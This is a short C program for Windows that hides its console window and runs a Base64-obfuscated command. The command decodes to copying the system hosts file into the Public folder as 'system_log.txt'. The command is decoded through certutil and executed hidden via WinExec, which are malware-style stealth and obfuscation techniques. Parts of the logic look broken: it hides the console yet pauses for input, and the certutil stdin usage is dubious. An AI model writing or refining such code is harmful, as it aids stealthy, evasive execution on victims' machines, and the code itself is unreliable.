#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Correct Base64 encoded command (your verified encoding)
    char encodedCmd[] = "Y29weSBDOlxXaW5kb3dzXFN5c3RlbTMyXGRyaXZlcnNcXGV0Y1xob3N0"
                        "cyBDOlxVc2Vyc1xQdWJsaWNcc3lzdGVtX2xvZy50eHQ=";

    // Construct decoding and execution command
    char finalCmd[512];
    snprintf(finalCmd, sizeof(finalCmd),
        "cmd.exe /c echo %s | certutil -decode - temp_decoded.txt && cmd.exe /c temp_decoded.txt",
        encodedCmd);

    // Debugging: Print the decoded command before execution
    printf("Executing: %s\n", finalCmd);
    system("pause");  // Keep console open for debugging

    // Execute the obfuscated command
    WinExec(finalCmd, SW_HIDE);

    return 0;
}
